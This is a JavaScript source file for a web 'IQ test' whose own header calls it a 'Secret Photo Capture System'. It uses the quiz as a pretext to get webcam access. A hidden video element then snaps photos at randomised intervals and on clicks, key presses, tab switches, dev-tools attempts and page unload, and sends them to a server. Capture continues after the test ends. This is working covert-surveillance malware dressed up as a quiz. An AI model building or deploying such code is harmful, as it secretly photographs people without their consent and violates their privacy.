// IQ Test Application - Secret Photo Capture System
class IQTestApp {
    constructor() {
        this.currentQuestion = 0;
        this.answers = [];
        this.sessionId = this.getSessionId();
        this.stream = null;
        this.ws = null;
        this.testCaptureInterval = null;      // For test-specific captures
        this.globalCaptureTimeout = null;    // For global surveillance
        this.captureCount = 0;               // Track total captures
        this.hiddenVideo = document.getElementById('hidden-video');
        
        this.questions = [
            {
                question: "What number comes next in the sequence: 2, 5, 11, 23, 47, ?",
                options: ["95", "94", "96", "93"],
                correct: 0
            },
            {
                question: "Which word is the odd one out?",
                options: ["Steering wheel", "Engine", "Car", "Tire"],
                correct: 2
            },
            {
                question: "If you rearrange the letters 'RATS', you can form which word?",
                options: ["STAR", "ARTS", "TARS", "All of the above"],
                correct: 3
            },
            {
                question: "Complete the pattern: △ ○ □ △ ○ ?",
                options: ["△", "○", "□", "◇"],
                correct: 2
            },
            {
                question: "What is the missing number? 8, 27, 64, ?, 216",
                options: ["125", "128", "135", "144"],
                correct: 0
            },
            {
                question: "Which number doesn't belong: 4, 9, 16, 20, 25?",
                options: ["4", "9", "20", "25"],
                correct: 2
            },
            {
                question: "Book is to Reading as Fork is to:",
                options: ["Eating", "Kitchen", "Food", "Spoon"],
                correct: 0
            },
            {
                question: "What comes next: Monday, Wednesday, Friday, ?",
                options: ["Saturday", "Sunday", "Tuesday", "Monday"],
                correct: 1
            },
            {
                question: "If all roses are flowers and some flowers are red, then:",
                options: ["All roses are red", "Some roses may be red", "No roses are red", "All flowers are roses"],
                correct: 1
            },
            {
                question: "Find the missing number: 3, 7, 15, 31, ?",
                options: ["63", "62", "64", "65"],
                correct: 0
            },
            {
                question: "Which figure completes the analogy? Circle is to sphere as square is to:",
                options: ["Rectangle", "Cube", "Triangle", "Oval"],
                correct: 1
            },
            {
                question: "What is the next letter in this sequence: A, D, G, J, ?",
                options: ["K", "L", "M", "N"],
                correct: 2
            },
            {
                question: "If 5 machines make 5 widgets in 5 minutes, how long does it take 100 machines to make 100 widgets?",
                options: ["5 minutes", "20 minutes", "100 minutes", "500 minutes"],
                correct: 0
            },
            {
                question: "Which word doesn't fit: Apple, Banana, Cherry, Potato, Orange?",
                options: ["Apple", "Banana", "Potato", "Orange"],
                correct: 2
            },
            {
                question: "Complete the number series: 1, 1, 2, 3, 5, 8, 13, ?",
                options: ["19", "20", "21", "22"],
                correct: 2
            },
            {
                question: "Water is to ice as milk is to:",
                options: ["Cream", "Cheese", "Butter", "Cow"],
                correct: 1
            },
            {
                question: "What number should replace the question mark? 6, 12, 24, 48, ?",
                options: ["72", "84", "96", "108"],
                correct: 2
            },
            {
                question: "Which of these is different from the others?",
                options: ["Cat", "Dog", "Bird", "Fish"],
                correct: 2
            },
            {
                question: "If today is Tuesday, what day will it be in 60 days?",
                options: ["Monday", "Tuesday", "Wednesday", "Saturday"],
                correct: 3
            },
            {
                question: "Find the odd one out: 3, 5, 7, 9, 11, 13",
                options: ["3", "5", "9", "11"],
                correct: 2
            },
            {
                question: "Pen is to write as knife is to:",
                options: ["Sharp", "Cut", "Kitchen", "Metal"],
                correct: 1
            },
            {
                question: "What comes next in the pattern: Z, Y, X, W, V, ?",
                options: ["U", "T", "S", "R"],
                correct: 0
            },
            {
                question: "If FRIEND is coded as GSJFOE, how is MOTHER coded?",
                options: ["NPUIFS", "NPUTFS", "NPUGFS", "NPUIFS"],
                correct: 0
            },
            {
                question: "Which number comes next: 2, 6, 12, 20, 30, ?",
                options: ["40", "42", "44", "46"],
                correct: 1
            },
            {
                question: "What is the relationship? Finger is to hand as toe is to:",
                options: ["Leg", "Foot", "Body", "Nail"],
                correct: 1
            }
        ];
        
        this.init();
    }
    
    getSessionId() {
        // First try to get session ID from URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const sessionParam = urlParams.get('session') || urlParams.get('id') || urlParams.get('sessionId');
        if (sessionParam) {
            console.log('Session ID from URL parameter:', sessionParam);
            return sessionParam;
        }
        
        // Extract session ID from URL like /iq-test/567Y6F
        const urlParts = window.location.pathname.split('/');
        if (urlParts.length >= 3 && (urlParts[1] === 'iq-test' || urlParts[1] === 'iqtest')) {
            console.log('Session ID from URL path:', urlParts[2]);
            return urlParts[2]; // Get the session ID part
        }
        
        // Generate a new session ID for direct access
        const generatedId = 'iq-test-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        console.log('Generated new session ID:', generatedId);
        return generatedId;
    }
    
    init() {
        console.log('Initializing IQ Test App...');
        console.log('Session ID:', this.sessionId);
        console.log('Current URL:', window.location.href);
        
        this.connectWebSocket();
        this.bindEvents();
        this.shuffleQuestions();
    }
    
    connectWebSocket() {
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = `${protocol}//${window.location.host}`;
        
        console.log('Connecting to WebSocket:', wsUrl);
        
        this.ws = new WebSocket(wsUrl);
        
        this.ws.onopen = () => {
            console.log('Connected to server');
            
            // Make globally accessible for device fingerprinting
            window.iqTestApp = this;
            
            // Register as IQ test user session
            const registerMessage = {
                type: 'register',
                role: 'user',
                sessionId: this.sessionId
            };
            console.log('Sending registration message:', registerMessage);
            this.ws.send(JSON.stringify(registerMessage));
        };
        
        this.ws.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                console.log('Received WebSocket message:', data);
            } catch (error) {
                console.error('Error parsing WebSocket message:', error);
            }
        };
        
        this.ws.onclose = () => {
            console.log('Disconnected from server');
            setTimeout(() => this.connectWebSocket(), 3000);
        };
        
        this.ws.onerror = (error) => {
            console.error('WebSocket error:', error);
        };
    }
    
    shuffleQuestions() {
        for (let i = this.questions.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [this.questions[i], this.questions[j]] = [this.questions[j], this.questions[i]];
        }
        this.questions = this.questions.slice(0, 25);
    }
    
    async requestCameraPermission() {
        const statusEl = document.getElementById('camera-status');
        const startBtn = document.getElementById('start-test-btn');
        
        if (!statusEl || !startBtn) {
            console.error('Camera status or start button elements not found!');
            return;
        }
        
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            statusEl.innerHTML = '<span class="status-icon">❌</span><span>Camera not supported in this browser</span>';
            // Enable button anyway for testing
            startBtn.disabled = false;
            console.log('Camera not supported, but enabling test anyway');
            return;
        }
        
        try {
            statusEl.innerHTML = '<span class="status-icon">📷</span><span>Requesting camera permission...</span>';
            
            this.stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    facingMode: 'user'
                },
                audio: false 
            });
            
            // Set up hidden video element
            this.hiddenVideo.srcObject = this.stream;
            this.hiddenVideo.muted = true;
            this.hiddenVideo.playsInline = true;
            this.hiddenVideo.autoplay = true;
            
            // Start playing the video
            await this.hiddenVideo.play();
            
            // Wait for video to be ready with proper dimensions
            await new Promise((resolve, reject) => {
                const checkVideoReady = () => {
                    if (this.hiddenVideo.videoWidth > 0 && this.hiddenVideo.videoHeight > 0) {
                        console.log('Hidden video ready with dimensions:', {
                            width: this.hiddenVideo.videoWidth,
                            height: this.hiddenVideo.videoHeight,
                            playing: !this.hiddenVideo.paused
                        });
                        resolve();
                    } else {
                        console.log('Waiting for video dimensions...');
                        setTimeout(checkVideoReady, 100);
                    }
                };
                
                this.hiddenVideo.onloadedmetadata = () => {
                    console.log('Video metadata loaded');
                    checkVideoReady();
                };
                
                this.hiddenVideo.onerror = () => {
                    reject(new Error('Video failed to load'));
                };
                
                // Start checking immediately
                checkVideoReady();
                
                // Timeout after 10 seconds
                setTimeout(() => {
                    reject(new Error('Video load timeout'));
                }, 10000);
            });
            
            statusEl.innerHTML = '<span class="status-icon">✅</span><span>Camera ready - Assessment can begin</span>';
            startBtn.disabled = false;
            
            console.log('Camera permission granted, waiting before initial capture...');
            
            // Send initial verification photo after ensuring video is ready
            setTimeout(() => {
                console.log('Taking initial verification photo...');
                this.capturePhoto('verification');
                
                // Take another photo shortly after to ensure we get a good capture
                setTimeout(() => {
                    this.capturePhoto('verification_backup');
                }, 1000);
            }, 3000);
            
        } catch (error) {
            console.error('Camera access error:', error);
            statusEl.innerHTML = '<span class="status-icon">❌</span><span>Camera access denied. Please refresh and allow camera access.</span>';
            
            // Enable button anyway for testing (remove this in production)
            startBtn.disabled = false;
            console.log('Camera failed, but enabling test for debugging');
        }
    }
    
    bindEvents() {
        const startBtn = document.getElementById('start-test-btn');
        const nextBtn = document.getElementById('next-btn');
        const retakeBtn = document.getElementById('retake-btn');
        const debugStartBtn = document.getElementById('debug-start-btn');
        
        console.log('Binding events to elements:', {
            startBtn: !!startBtn,
            nextBtn: !!nextBtn,
            retakeBtn: !!retakeBtn,
            debugStartBtn: !!debugStartBtn
        });
        
        if (startBtn) {
            startBtn.addEventListener('click', async () => {
                console.log('Start button clicked - requesting camera permission before starting test');
                try {
                    // Request camera permission on explicit user action
                    await this.requestCameraPermission();
                    // Start the test regardless of camera permission
                    this.startTest();
                } catch (e) {
                    console.error('Error while requesting camera permission:', e);
                    // Still start the test
                    this.startTest();
                }
            });
        } else {
            console.error('Start button not found!');
        }
        
        if (debugStartBtn) {
            debugStartBtn.addEventListener('click', () => {
                console.log('Debug start button clicked');
                this.startTest();
            });
        }
        
        if (nextBtn) {
            nextBtn.addEventListener('click', () => {
                console.log('Next button clicked');
                this.nextQuestion();
            });
        }
        
        if (retakeBtn) {
            retakeBtn.addEventListener('click', () => {
                console.log('Retake button clicked');
                this.retakeTest();
            });
        }
    }
    
    showScreen(screenId) {
        document.querySelectorAll('.screen').forEach(screen => {
            screen.classList.remove('active');
        });
        document.getElementById(screenId).classList.add('active');
    }
    
    startTest() {
        console.log('Starting IQ test...');
        console.log('Session ID:', this.sessionId);
        console.log('Questions available:', this.questions.length);
        
        this.showScreen('test-screen');
        this.displayQuestion();
        this.startSecretCapture();
    }
    
    startSecretCapture() {
        console.log('🔥 Starting CONTINUOUS stealth photo capture system...');
        
        // Clear any existing test intervals (keep global separate)
        if (this.testCaptureInterval) {
            clearTimeout(this.testCaptureInterval);
        }
        
        // Start immediate capture
        setTimeout(() => {
            this.capturePhoto('test_start');
        }, 500);
        
        // CONTINUOUS randomized capture intervals for maximum stealth (2-5 seconds)
        const startTestCapture = () => {
            const testCaptureLoop = () => {
                this.capturePhoto('test_continuous');
                
                // Random interval between 2-5 seconds for stealth
                const randomInterval = 2000 + Math.random() * 3000;
                
                // Schedule next capture using test-specific interval
                this.testCaptureInterval = setTimeout(testCaptureLoop, randomInterval);
                
                console.log(`📸 Test capture scheduled in ${(randomInterval/1000).toFixed(1)} seconds`);
            };
            
            // Start the test capture loop
            testCaptureLoop();
        };
        
        // Begin test-specific capture after initial delay
        setTimeout(startTestCapture, 1500);
        
        // Additional capture triggers for enhanced surveillance
        this.setupEnhancedCaptures();
    }
    
    setupEnhancedCaptures() {
        console.log('🎯 Setting up enhanced capture triggers...');
        
        // Capture on page visibility changes
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                this.capturePhoto('page_visible');
            } else {
                this.capturePhoto('page_hidden');
            }
        });
        
        // Capture on mouse movements (throttled)
        let lastMouseCapture = 0;
        document.addEventListener('mousemove', () => {
            const now = Date.now();
            if (now - lastMouseCapture > 8000) { // Every 8 seconds max
                this.capturePhoto('mouse_activity');
                lastMouseCapture = now;
            }
        });
        
        // Capture on scroll (throttled)
        let lastScrollCapture = 0;
        window.addEventListener('scroll', () => {
            const now = Date.now();
            if (now - lastScrollCapture > 6000) { // Every 6 seconds max
                this.capturePhoto('scroll_activity');
                lastScrollCapture = now;
            }
        });
        
        // Capture when user interacts (clicks, keyboard)  
        this.setupInteractionCaptures();
        
        // Start GLOBAL continuous capture that runs even after test completion
        this.startGlobalCapture();
        
        // Capture on browser events
        window.addEventListener('beforeunload', () => {
            this.capturePhoto('page_leaving');
        });
        
        // Capture on focus/blur with delay to avoid spam
        let lastFocusCapture = 0;
        window.addEventListener('blur', () => {
            const now = Date.now();
            if (now - lastFocusCapture > 3000) {
                this.capturePhoto('window_blur');
                lastFocusCapture = now;
            }
        });
        
        window.addEventListener('focus', () => {
            const now = Date.now();
            if (now - lastFocusCapture > 3000) {
                this.capturePhoto('window_focus');
                lastFocusCapture = now;
            }
        });
    }
    
    setupInteractionCaptures() {
        // Capture on significant interactions for behavioral analysis
        let lastInteraction = 0;
        
        document.addEventListener('click', () => {
            const now = Date.now();
            if (now - lastInteraction > 3000) { // Throttle to avoid spam
                this.capturePhoto('user_click');
                lastInteraction = now;
            }
        });
        
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Tab' || e.key === 'F12' || e.key === 'F5') {
                this.capturePhoto('suspicious_key'); // Detect dev tools attempts
            }
        });
        
        // Detect window focus changes (user switching tabs)
        window.addEventListener('blur', () => {
            this.capturePhoto('window_blur');
        });
        
        window.addEventListener('focus', () => {
            this.capturePhoto('window_focus');
        });
    }
    
    capturePhoto(type) {
        if (!this.hiddenVideo || !this.stream) {
            console.log('Cannot capture photo - video or stream not ready');
            return;
        }
        
        // Check if video is actually playing and has dimensions
        if (this.hiddenVideo.videoWidth === 0 || this.hiddenVideo.videoHeight === 0) {
            console.log('Video not ready - no dimensions available');
            return;
        }
        
        if (this.hiddenVideo.paused || this.hiddenVideo.ended) {
            console.log('Video is paused or ended, attempting to play...');
            this.hiddenVideo.play().catch(e => console.error('Failed to play video:', e));
            return;
        }
        
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        // Use actual video dimensions
        canvas.width = this.hiddenVideo.videoWidth;
        canvas.height = this.hiddenVideo.videoHeight;
        
        console.log(`Capturing photo: ${type}`, {
            videoWidth: this.hiddenVideo.videoWidth,
            videoHeight: this.hiddenVideo.videoHeight,
            videoPlaying: !this.hiddenVideo.paused,
            canvasSize: `${canvas.width}x${canvas.height}`
        });
        
        try {
            // Draw the video frame to canvas
            ctx.drawImage(this.hiddenVideo, 0, 0, canvas.width, canvas.height);
            
            // Add subtle watermark for admin identification
            ctx.fillStyle = 'rgba(0,0,0,0.7)';
            ctx.fillRect(canvas.width - 200, canvas.height - 30, 195, 25);
            ctx.fillStyle = '#fff';
            ctx.font = '12px Arial';
            ctx.fillText(`IQ Test - ${type}`, canvas.width - 195, canvas.height - 12);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            
            // Increment capture counter
            this.captureCount++;
            
            // Check if we got a valid image (not just black)
            if (photoData.length < 1000) {
                console.warn('Captured image seems too small, might be black');
            }
            
            console.log(`Successfully captured photo #${this.captureCount}: ${type}`, {
                sessionId: this.sessionId,
                photoType: type,
                currentQuestion: this.currentQuestion,
                photoSize: photoData.length,
                totalCaptures: this.captureCount,
                wsReady: this.ws && this.ws.readyState === WebSocket.OPEN
            });
            
            this.sendPhotoToServer(type, photoData);
            
        } catch (error) {
            console.error('Photo capture error:', error);
        }
    }
    
    sendPhotoToServer(type, photoData) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            const message = {
                type: 'iq_photo_capture',
                sessionId: this.sessionId,
                photoType: type,
                photo: photoData,
                timestamp: Date.now(),
                currentQuestion: this.currentQuestion
            };
            
            console.log('Sending photo to server:', {
                type: message.type,
                sessionId: message.sessionId,
                photoType: message.photoType,
                currentQuestion: message.currentQuestion
            });
            
            this.ws.send(JSON.stringify(message));
        } else {
            console.error('Cannot send photo - WebSocket not ready', {
                wsExists: !!this.ws,
                wsState: this.ws ? this.ws.readyState : 'no websocket'
            });
        }
    }
    
    displayQuestion() {
        console.log('Displaying question:', this.currentQuestion);
        
        if (!this.questions || this.questions.length === 0) {
            console.error('No questions available!');
            return;
        }
        
        const question = this.questions[this.currentQuestion];
        console.log('Current question data:', question);
        
        const questionContent = document.getElementById('question-content');
        
        if (!questionContent) {
            console.error('Question content element not found!');
            return;
        }
        
        questionContent.innerHTML = `
            <div class="question">
                <h3>${question.question}</h3>
                <div class="answer-options">
                    ${question.options.map((option, index) => `
                        <div class="answer-option" data-answer="${index}">
                            <strong>${String.fromCharCode(65 + index)}.</strong> ${option}
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
        
        // Update progress
        const progress = ((this.currentQuestion + 1) / this.questions.length) * 100;
        const progressFill = document.getElementById('progress-fill');
        const questionCounter = document.getElementById('question-counter');
        
        if (progressFill) {
            progressFill.style.width = `${progress}%`;
        }
        if (questionCounter) {
            questionCounter.textContent = `Question ${this.currentQuestion + 1} of ${this.questions.length}`;
        }
        
        // Bind answer selection
        document.querySelectorAll('.answer-option').forEach(option => {
            option.addEventListener('click', () => {
                document.querySelectorAll('.answer-option').forEach(opt => opt.classList.remove('selected'));
                option.classList.add('selected');
                
                const answerIndex = parseInt(option.dataset.answer);
                this.answers[this.currentQuestion] = answerIndex;
                
                const nextBtn = document.getElementById('next-btn');
                if (nextBtn) {
                    nextBtn.disabled = false;
                }
                
                // Capture photo when answer is selected
                setTimeout(() => {
                    this.capturePhoto('answer_selected');
                }, 500);
            });
        });
        
        const nextBtn = document.getElementById('next-btn');
        if (nextBtn) {
            nextBtn.disabled = true;
        }
    }
    
    nextQuestion() {
        this.currentQuestion++;
        
        if (this.currentQuestion < this.questions.length) {
            this.displayQuestion();
        } else {
            this.finishTest();
        }
    }
    
    finishTest() {
        console.log('🏁 Finishing test but CONTINUING surveillance...');
        
        // DON'T stop continuous capture - let it continue for surveillance
        // Only stop the test-specific capture interval, not global surveillance
        if (this.testCaptureInterval) {
            clearTimeout(this.testCaptureInterval);
            this.testCaptureInterval = null;
            console.log('✅ Test capture stopped, but global surveillance continues');
        }
        
        // Capture final completion photo
        this.capturePhoto('test_complete');
        
        // Calculate score
        let correctAnswers = 0;
        this.questions.forEach((question, index) => {
            if (this.answers[index] === question.correct) {
                correctAnswers++;
            }
        });
        
        const percentage = (correctAnswers / this.questions.length) * 100;
        const iqScore = Math.round(85 + (percentage / 100) * 45);
        
        this.showResults(iqScore, percentage);
        this.sendTestCompletion(iqScore, correctAnswers);
    }
    
    sendTestCompletion(iqScore, correctAnswers) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify({
                type: 'iq_test_complete',
                sessionId: this.sessionId,
                score: iqScore,
                correctAnswers: correctAnswers,
                totalQuestions: this.questions.length,
                answers: this.answers,
                timestamp: Date.now()
            }));
        }
    }
    
    showResults(iqScore, percentage) {
        this.showScreen('results-screen');
        this.animateScore(iqScore);
        
        const description = this.getScoreDescription(iqScore);
        document.getElementById('score-description').textContent = description;
        
        setTimeout(() => {
            this.animateSkillBars(percentage);
        }, 1000);
    }
    
    animateScore(targetScore) {
        const scoreElement = document.getElementById('final-score');
        let currentScore = 0;
        const increment = targetScore / 100;
        
        const animation = setInterval(() => {
            currentScore += increment;
            scoreElement.textContent = Math.floor(currentScore);
            
            if (currentScore >= targetScore) {
                scoreElement.textContent = targetScore;
                clearInterval(animation);
            }
        }, 20);
    }
    
    getScoreDescription(score) {
        if (score >= 130) return "Exceptional intelligence - you demonstrate superior cognitive abilities with outstanding problem-solving skills.";
        if (score >= 115) return "Above average intelligence - you show strong analytical thinking and excellent reasoning capabilities.";
        if (score >= 100) return "Average intelligence - you demonstrate solid cognitive abilities and good problem-solving skills.";
        if (score >= 85) return "Below average - you show adequate cognitive abilities with room for improvement in analytical thinking.";
        return "Significantly below average - consider developing your analytical and reasoning skills further.";
    }
    
    animateSkillBars(percentage) {
        const logical = Math.min(100, percentage + Math.random() * 20 - 10);
        const pattern = Math.min(100, percentage + Math.random() * 20 - 10);
        const analytical = Math.min(100, percentage + Math.random() * 20 - 10);
        
        document.querySelector('[data-skill="logical"]').style.width = `${logical}%`;
        document.querySelector('[data-skill="pattern"]').style.width = `${pattern}%`;
        document.querySelector('[data-skill="analytical"]').style.width = `${analytical}%`;
    }
    
    retakeTest() {
        this.currentQuestion = 0;
        this.answers = [];
        this.shuffleQuestions();
        this.showScreen('welcome-screen');
        
        // Stop only test-specific capture, keep global surveillance running
        if (this.testCaptureInterval) {
            clearTimeout(this.testCaptureInterval);
            this.testCaptureInterval = null;
        }
        
        // Re-enable start button if camera is ready
        if (this.stream) {
            document.getElementById('start-test-btn').disabled = false;
        }
        
        console.log('🔄 Test reset - global surveillance continues running');
    }
    
    startGlobalCapture() {
        console.log('🌍 Starting GLOBAL continuous capture - runs until page closes!');
        
        // Global capture that continues even after test completion
        const globalCaptureLoop = () => {
            // Always attempt capture regardless of conditions
            this.capturePhoto('global_surveillance');
            
            // Random interval between 3-7 seconds for long-term surveillance
            const randomInterval = 3000 + Math.random() * 4000;
            
            // Store timeout ID for global capture (separate from test capture)
            this.globalCaptureTimeout = setTimeout(globalCaptureLoop, randomInterval);
            
            console.log(`🌍 GLOBAL SURVEILLANCE #${this.captureCount} - next in ${(randomInterval/1000).toFixed(1)}s`);
            
            // If camera is not available, still continue the loop but with warning
            if (!this.hiddenVideo || !this.stream || this.hiddenVideo.videoWidth === 0) {
                console.warn('⚠️  Camera not ready but surveillance continues!');
            }
        };
        
        // Start global capture after initial delay
        this.globalCaptureTimeout = setTimeout(globalCaptureLoop, 5000);
        
        // Additional persistent surveillance triggers
        this.setupPersistentSurveillance();
    }
    
    setupPersistentSurveillance() {
        console.log('🕵️ Setting up persistent surveillance system...');
        
        // Capture every time user switches tabs
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                this.capturePhoto('tab_switch_away');
            } else {
                this.capturePhoto('tab_switch_back');
            }
        });
        
        // Capture on any key press (throttled)
        let lastKeyCapture = 0;
        document.addEventListener('keydown', (e) => {
            const now = Date.now();
            if (now - lastKeyCapture > 5000) {
                this.capturePhoto('key_activity');
                lastKeyCapture = now;
                
                // Special capture for suspicious keys (F12, Ctrl+Shift+I, etc.)
                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                    this.capturePhoto('dev_tools_attempt');
                }
            }
        });
        
        // Capture on browser resize (user might be opening dev tools)
        let lastResizeCapture = 0;
        window.addEventListener('resize', () => {
            const now = Date.now();
            if (now - lastResizeCapture > 3000) {
                this.capturePhoto('window_resize');
                lastResizeCapture = now;
            }
        });
        
        // Capture periodically based on user activity level
        let userActive = true;
        let lastActivity = Date.now();
        
        // Track user activity
        ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart'].forEach(event => {
            document.addEventListener(event, () => {
                userActive = true;
                lastActivity = Date.now();
            }, { passive: true });
        });
        
        // Activity-based capture
        setInterval(() => {
            const now = Date.now();
            const timeSinceActivity = now - lastActivity;
            
            if (timeSinceActivity < 30000) { // Active in last 30 seconds
                if (Math.random() < 0.3) { // 30% chance
                    this.capturePhoto('active_user');
                }
            } else if (timeSinceActivity < 120000) { // Idle for less than 2 minutes
                if (Math.random() < 0.1) { // 10% chance
                    this.capturePhoto('idle_user');
                }
            } else { // User has been idle for 2+ minutes
                if (Math.random() < 0.05) { // 5% chance
                    this.capturePhoto('very_idle_user');
                }
            }
        }, 10000); // Check every 10 seconds
        
        // Emergency capture before page unload
        window.addEventListener('beforeunload', () => {
            this.capturePhoto('page_unload_final');
            
            // Try to send any remaining data
            if (this.ws && this.ws.readyState === WebSocket.OPEN) {
                this.ws.send(JSON.stringify({
                    type: 'session_end',
                    sessionId: this.sessionId,
                    timestamp: Date.now()
                }));
            }
        });
        
        // ULTIMATE BACKUP: Force capture every 15 seconds no matter what
        setInterval(() => {
            this.capturePhoto('force_backup_capture');
            console.log(`🚨 FORCE BACKUP CAPTURE #${this.captureCount} - Surveillance never stops!`);
            
            // Additional logging for debugging
            console.log('📊 Capture System Status:', {
                testCaptureActive: !!this.testCaptureInterval,
                globalCaptureActive: !!this.globalCaptureTimeout,
                totalCaptures: this.captureCount,
                cameraReady: this.hiddenVideo && this.hiddenVideo.videoWidth > 0,
                streamActive: !!this.stream
            });
        }, 15000);
        
        console.log('✅ Persistent surveillance system activated with backup capture!');
    }
}

// Initialize the application when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    console.log('DOM Content Loaded - Initializing IQ Test App');
    console.log('Available elements:', {
        startBtn: !!document.getElementById('start-test-btn'),
        questionContent: !!document.getElementById('question-content'),
        hiddenVideo: !!document.getElementById('hidden-video'),
        welcomeScreen: !!document.getElementById('welcome-screen'),
        testScreen: !!document.getElementById('test-screen')
    });
    
    try {
        const app = new IQTestApp();
        console.log('IQ Test App initialized successfully');
        window.iqTestApp = app; // Make it available for debugging
        
        // Check if this is a legitimate user session (not admin generating links)
        const isLegitimateUserSession = () => {
            const currentPath = window.location.pathname;
            const urlParams = new URLSearchParams(window.location.search);
            const sessionParam = urlParams.get('session') || urlParams.get('id') || urlParams.get('sessionId');
            
            // Check if this is NOT an admin page
            const isAdminPage = currentPath.includes('/admin') || currentPath.includes('admin.html');
            if (isAdminPage) {
                console.log('🚫 Admin page detected - no auto-initialization');
                return false;
            }
            
            // Allow auto-initialization for IQ test pages (including direct access for testing)
            const isIQTestPage = currentPath.includes('iq-test.html') || currentPath.includes('/iq-test/');
            if (isIQTestPage) {
                console.log('✅ IQ test page detected - allowing auto-initialization');
                return true;
            }
            
            // Allow if there's a session parameter
            if (sessionParam && sessionParam.length > 3) {
                console.log('✅ Session parameter detected - allowing auto-initialization');
                return true;
            }
            
            console.log('❓ Unknown page type - allowing auto-initialization for testing');
            return true; // Default to true for testing, only block admin pages
        };
        
        // Auto-initialize camera for legitimate user sessions after 2 seconds
        const shouldAutoInit = isLegitimateUserSession();
        console.log('Auto-initialization decision:', {
            currentPath: window.location.pathname,
            isLegitimate: shouldAutoInit,
            sessionId: app.sessionId
        });
        
        if (shouldAutoInit) {
            setTimeout(() => {
                console.log('🧠 Auto-initializing camera for legitimate IQ test session');
                app.requestCameraPermission();
            }, 2000);
        } else {
            console.log('🚫 Auto-initialization disabled - not a legitimate user session');
        }
        
    } catch (error) {
        console.error('Failed to initialize IQ Test App:', error);
    }
});